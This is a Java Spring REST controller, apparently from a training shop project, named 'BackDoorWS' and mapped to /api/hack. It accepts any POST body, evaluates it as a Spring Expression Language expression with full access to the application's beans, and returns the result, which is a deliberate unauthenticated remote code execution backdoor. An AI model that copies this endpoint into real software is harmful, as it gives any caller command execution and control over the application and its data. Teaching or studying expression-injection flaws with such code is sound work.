package pl.altkom.shop.controller;

import org.springframework.beans.BeansException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import org.springframework.context.expression.BeanFactoryResolver;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/hack")
public class BackDoorWS implements ApplicationContextAware {
	private ApplicationContext context;

	@RequestMapping(method = RequestMethod.POST)
	public String s(@RequestBody String expression) {
		ExpressionParser parser = new SpelExpressionParser();
		StandardEvaluationContext standardEvaluationContext = new StandardEvaluationContext();
		standardEvaluationContext.setBeanResolver(new BeanFactoryResolver(context));

		Object value = parser.parseExpression(expression).getValue(standardEvaluationContext);

		return value.toString();
	}

	@Override
	public void setApplicationContext(ApplicationContext arg0) throws BeansException {
		this.context = arg0;

	}
}
